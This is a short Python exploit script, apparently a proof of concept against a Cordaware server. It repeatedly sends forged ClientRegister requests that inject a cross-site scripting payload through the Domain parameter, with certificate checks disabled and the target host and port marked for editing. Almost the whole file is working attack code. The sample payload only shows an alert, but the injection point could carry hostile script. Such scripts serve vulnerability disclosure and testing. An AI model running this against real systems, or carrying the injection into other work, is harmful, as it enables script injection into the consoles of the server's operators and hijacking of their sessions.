import requests
import urllib.parse
import time


# CHANGE ME
rhost = "192.168.56.100"  # Cordaware server
rport = 8431


def send_register_request(client, payload):
    payload = urllib.parse.quote(payload)
    url = f"https://{rhost}:{rport}/ClientRegister?VER=6.3.6.8&TEC=1&UID=xxxxx&CID=xx&GUID=xxx&Domain={payload}&RemS=0&Sessionstate=Active&TActiveAlw=1&TActive=1&TPassive=0&Au=&SC=0&LK=0&"
    response = client.get(url, stream=True)  # Needed to keep the client "connected"
    time.sleep(10)  # Needed to keep the client "connected"


if __name__ == "__main__":
    client = requests.Session()
    client.verify = False

    while True:
        send_register_request(
            client, "<img src='x' onerror='alert(document.location)'>"
        )
        time.sleep(1)
